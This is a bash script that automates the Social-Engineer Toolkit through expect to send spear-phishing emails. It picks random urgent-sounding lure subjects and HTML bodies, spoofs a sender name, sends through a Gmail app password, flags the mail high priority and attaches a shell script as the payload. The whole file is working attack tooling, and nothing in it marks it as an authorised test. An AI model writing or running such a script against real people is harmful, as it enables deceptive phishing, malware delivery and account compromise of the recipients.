#!/bin/bash

# Variables for email configuration
FROM_EMAIL=
TO_EMAIL=
APP_PASSWORD=
ATTACHMENT_PATH="~/Desktop/apk.sh"

# Define a list of 10 possible subjects to choose from
SUBJECTS=("Important Update" "Your Account Alert" "Action Required" "Security Notice" "Special Offer" \
          "New Features Unlocked" "Exclusive Deal" "Attention Needed" "System Notification" "Urgent Update")

# Define a folder containing multiple HTML files
HTML_FOLDER="~/Desktop/Generated-Emails"

# Select a random subject and HTML file
RANDOM_SUBJECT=${SUBJECTS[$RANDOM % ${#SUBJECTS[@]}]}
RANDOM_HTML=$(find $HTML_FOLDER -type f -name "*.html" | shuf -n 1)

# Automating the setoolkit process
echo "
Running SEToolkit Automation...
Selected Subject: $RANDOM_SUBJECT
Selected HTML file: $RANDOM_HTML
Sending email from: $FROM_EMAIL to: $TO_EMAIL
"

# Automate interaction with setoolkit using `expect`
expect <<EOF
spawn setoolkit

# Select Email Attacks
expect "set> " { send "5\r" }

# Select Spear-Phishing Attack Vectors
expect "set:mailer> " { send "1\r" }

# Select Option 2: One-Time Use Email Template
expect "set:phishing> " { send "2\r" }

# Enter the subject of the email
expect "Subject of the email: " { send "$RANDOM_SUBJECT\r" }

# Choose HTML format
expect "Send the message as html or plain?" { send "h\r" }

# Provide the body of the email from a randomly chosen HTML file
expect "Enter the body of the message" {
    send_user "Loading HTML file $RANDOM_HTML\n"
    set html_body [exec cat $RANDOM_HTML]
    send "$html_body\r"
}
expect "Next line of the body: " { send "END\r" }

# Enter the target email address
expect "Send email to: " { send "$TO_EMAIL\r" }

# Select the option to use a Gmail account
expect "1. Use a gmail Account for your email attack" { send "1\r" }

# Provide your Gmail email address
expect "Your gmail email address: " { send "$FROM_EMAIL\r" }

# Provide the FROM NAME that the recipient will see
expect "The FROM NAME the user will see: " { send "Jetskis Are US\r" }

# Enter your Gmail app password
expect "Email password: " { send "$APP_PASSWORD\r" }

# Flag the message as high priority
expect "Flag this message/s as high priority?" { send "yes\r" }

# Select to attach a file
expect "Do you want to attach a file" { send "y\r" }

# Specify the path to the file attachment
expect "Enter the path to the file you want to attach:" { send "$ATTACHMENT_PATH\r" }

# Do not attach an inline file
expect "Do you want to attach an inline file" { send "n\r" }

# Wait for the "Press <return> to continue" prompt and send the return key
expect "Press <return> to continue" { send "\r" }

# Exit the setoolkit
expect "set> " { send "exit\r" }

# Wait for the email to be sent or any additional prompts
expect eof
EOF

echo "Email sent successfully using SEToolkit!"
